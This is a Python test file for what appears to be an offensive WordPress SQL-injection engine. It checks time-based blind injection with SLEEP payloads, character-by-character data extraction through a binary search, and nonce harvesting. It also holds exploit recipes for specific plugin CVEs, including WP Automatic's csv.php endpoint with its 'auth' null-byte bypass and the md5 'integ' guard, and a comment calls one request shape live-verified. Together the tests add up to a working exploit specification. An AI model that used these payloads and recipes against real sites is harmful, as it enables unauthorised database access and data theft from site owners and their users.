from unittest.mock import MagicMock
from wp import sqli as wp_sqli
from wp import recipes as wp_recipes

RECIPE = {
    "method": "GET",
    "endpoint": "/wp-admin/admin-ajax.php",
    "params": {"action": "listing"},
    "inject_param": "orderby",
    "payload": "title,(SELECT CASE WHEN ({cond}) THEN SLEEP({sleep}) ELSE 0 END)",
    "true_cond": "1=1",
    "false_cond": "1=2",
}


def test_confirm_true_when_injected_is_slower(monkeypatch):
    # control ~0.1s, injected ~5.2s → clear delay → confirmed
    seq = iter([0.1, 5.2])
    monkeypatch.setattr(wp_sqli, "_timed", lambda *a, **k: next(seq))
    out = wp_sqli.confirm("http://t", MagicMock(), RECIPE, delay=5)
    assert out["confirmed"] is True
    assert out["injected_s"] == 5.2 and out["control_s"] == 0.1

def test_confirm_false_when_no_delay(monkeypatch):
    seq = iter([0.1, 0.15])            # both fast → not injectable
    monkeypatch.setattr(wp_sqli, "_timed", lambda *a, **k: next(seq))
    out = wp_sqli.confirm("http://t", MagicMock(), RECIPE, delay=5)
    assert out["confirmed"] is False

def test_confirm_none_on_transport_error(monkeypatch):
    monkeypatch.setattr(wp_sqli, "_timed", lambda *a, **k: None)
    assert wp_sqli.confirm("http://t", MagicMock(), RECIPE) is None

def test_timed_injects_payload_into_the_right_param():
    http = MagicMock()
    wp_sqli._timed("http://t/", http, RECIPE, "1=1", 5)
    _, kwargs = http.get.call_args
    sent = kwargs["params"]["orderby"]
    assert "SLEEP(5)" in sent and "1=1" in sent
    assert kwargs["params"]["action"] == "listing"   # base params preserved

def test_timed_post_uses_data_channel():
    http = MagicMock()
    r = {**RECIPE, "method": "POST"}
    wp_sqli._timed("http://t", http, r, "1=1", 3)
    _, kwargs = http.post.call_args
    assert kwargs["data"]["orderby"].endswith("ELSE 0 END)")

def test_extract_reads_string_char_by_char(monkeypatch):
    # simulate the DB answering "wp" then NUL: drive _extract_char by ASCII code
    codes = iter([ord("w"), ord("p"), 0])
    monkeypatch.setattr(wp_sqli, "_extract_char",
                        lambda *a, **k: next(codes))
    assert wp_sqli.extract("http://t", MagicMock(), RECIPE, "SELECT 1", length=8) == "wp"

def test_extract_char_binary_search_resolves_ascii(monkeypatch):
    # _bit_true answers "is ASCII(char) > mid?" for the letter 'A' (65)
    target = ord("A")
    monkeypatch.setattr(wp_sqli, "_bit_true",
                        lambda base, http, recipe, cond, delay, margin:
                        _gt_from_cond(cond, target))
    code = wp_sqli._extract_char("http://t", MagicMock(), RECIPE, "SELECT 1", 1, 3, 1.0)
    assert code == target

def _gt_from_cond(cond, target):
    # cond looks like ASCII(SUBSTRING((..),p,1))>NN — compare target to NN
    n = int(cond.rsplit(">", 1)[1])
    return target > n

def test_sqli_recipe_present_for_farm_plugin():
    r = wp_recipes.find_sqli("wp-google-map-plugin")
    assert len(r) == 1
    assert r[0]["cve"] == "CVE-2026-2580"
    assert r[0]["inject_param"] == "orderby"
    assert r[0]["affected"] == "<=4.9.1"


def test_wp_automatic_registry_recipe_wires_end_to_end():
    # Uses the REAL registry recipe (not a synthetic dict) to catch wiring bugs
    # between wp_recipes' field names and what _timed expects — including the
    # integ=md5(q) companion the WP Automatic csv.php guard demands.
    r = wp_recipes.find_sqli("wp-automatic")[0]
    assert r["cve"] == "CVE-2024-27956"
    assert r["endpoint"].endswith("/inc/csv.php")
    assert r["inject_param"] == "q"
    http = MagicMock()
    wp_sqli._timed("http://t", http, r, "1=1", 5)
    p = http.get.call_args.kwargs["params"]
    assert p["integ"] == hashlib.md5(p["q"].encode()).hexdigest()
    assert p["auth"] == "\x00"


# ── real wp-google-map-plugin request shape (live-verified) ───────────────────
def test_gmap_recipe_real_unauth_chain():
    r = wp_recipes.find_sqli("wp-google-map-plugin")[0]
    # POST dispatch, but the orderby sink is a $_GET read
    assert r["method"] == "POST" and r["inject_in"] == "params"
    assert r["data"]["action"] == "wpgmp_ajax_call"
    assert r["data"]["operation"] == "wpgmp_processor"
    assert r["params"]["page"] == "wpgmp_manage_map"
    # fc-call-nonce harvested off the frontend into the POST body
    assert r["nonce_from"]["into"] == "data" and r["nonce_from"]["param"] == "nonce"


def test_timed_inject_in_params_overrides_post_default():
    http = MagicMock()
    r = {**RECIPE, "method": "POST", "inject_in": "params",
         "data": {"action": "wpgmp_ajax_call"}}
    wp_sqli._timed("http://t", http, r, "1=1", 5)
    _, kwargs = http.post.call_args
    # sink rides the query string; the POST body is left untouched
    assert "SLEEP(5)" in kwargs["params"]["orderby"]
    assert "orderby" not in kwargs["data"]
    assert kwargs["data"]["action"] == "wpgmp_ajax_call"


def test_resolve_nonce_harvests_into_data_without_mutating_original():
    http = MagicMock()
    http.get.return_value = MagicMock(text='var o={"nonce":"a1b2c3d4"};')
    r = {**RECIPE, "method": "POST", "data": {"action": "wpgmp_ajax_call"},
         "nonce_from": {"url": "/", "key": "nonce", "param": "nonce", "into": "data"}}
    out = wp_sqli._resolve_nonce("http://t", http, r)
    assert out["data"]["nonce"] == "a1b2c3d4"
    assert out["data"]["action"] == "wpgmp_ajax_call"     # existing body preserved
    assert r["data"] == {"action": "wpgmp_ajax_call"}     # original untouched


def test_confirm_harvests_nonce_once_then_times(monkeypatch):
    http = MagicMock()
    http.get.return_value = MagicMock(text='{"nonce":"deadbeef01"}')
    seen = []
    monkeypatch.setattr(wp_sqli, "_timed",
                        lambda b, h, rec, cond, sleep: (seen.append(rec) or
                                                        (0.1 if sleep == 0 else 5.3)))
    r = {**RECIPE, "method": "POST", "data": {"action": "x"},
         "nonce_from": {"url": "/", "key": "nonce", "param": "nonce", "into": "data"}}
    out = wp_sqli.confirm("http://t", http, r, delay=5)
    assert out["confirmed"] is True
    assert seen and all(rec["data"]["nonce"] == "deadbeef01" for rec in seen)


# ── integrity companion param: integ = md5(q) (WP Automatic CVE-2024-27956) ────
# csv.php runs $wpdb->get_results($_REQUEST['q']) behind a guard that requires
# integ == md5(q). Because q (the whole injected query) changes every request,
# the engine must recompute the hash per request — not template a static value.
import hashlib

_AUTO = {
    "method": "GET",
    "endpoint": "/wp-content/plugins/wp-automatic/inc/csv.php",
    "params": {"auth": "\x00"},
    "inject_param": "q",
    "inject_in": "params",
    "integrity": {"param": "integ", "algo": "md5"},
    "payload": "SELECT IF(({cond}),SLEEP({sleep}),0)",
    "true_cond": "1=1",
    "false_cond": "1=2",
}


def test_timed_computes_integrity_hash_of_injected_value():
    http = MagicMock()
    wp_sqli._timed("http://t/", http, _AUTO, "1=1", 5)
    params = http.get.call_args.kwargs["params"]
    q = params["q"]
    assert q == "SELECT IF((1=1),SLEEP(5),0)"
    assert params["integ"] == hashlib.md5(q.encode()).hexdigest()
    assert params["auth"] == "\x00"          # static bypass param preserved


def test_timed_integrity_recomputed_when_query_changes():
    http = MagicMock()
    wp_sqli._timed("http://t/", http, _AUTO, "1=2", 0)      # control query
    i_control = http.get.call_args.kwargs["params"]["integ"]
    wp_sqli._timed("http://t/", http, _AUTO, "1=1", 5)      # injected query
    i_injected = http.get.call_args.kwargs["params"]["integ"]
    # different q → different integ (proves it isn't a stale/static hash)
    assert i_control != i_injected


def test_timed_without_integrity_adds_no_companion_param():
    # regression: recipes with no 'integrity' (e.g. gmap) must be unaffected
    http = MagicMock()
    wp_sqli._timed("http://t/", http, RECIPE, "1=1", 5)
    assert "integ" not in http.get.call_args.kwargs["params"]
